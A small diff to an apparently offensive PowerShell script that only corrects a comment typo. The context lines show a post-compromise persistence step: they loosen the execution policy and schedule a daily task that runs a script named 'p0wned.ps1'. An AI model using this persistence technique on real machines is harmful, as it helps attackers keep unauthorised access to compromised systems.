@@ -10,7 +10,7 @@
 # You may not be able to run this anyway...
 # But if you can, a lul is a win. 
 
-# After intial access and ability to set secution policy has been obtained
+# After intial access and ability to set execution policy has been obtained
 Set-ExecutionPolicy RemoteSigned
 $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "C:\p0wned.ps1"
 $trigger = New-ScheduledTaskTrigger -Daily -At 3:00PM
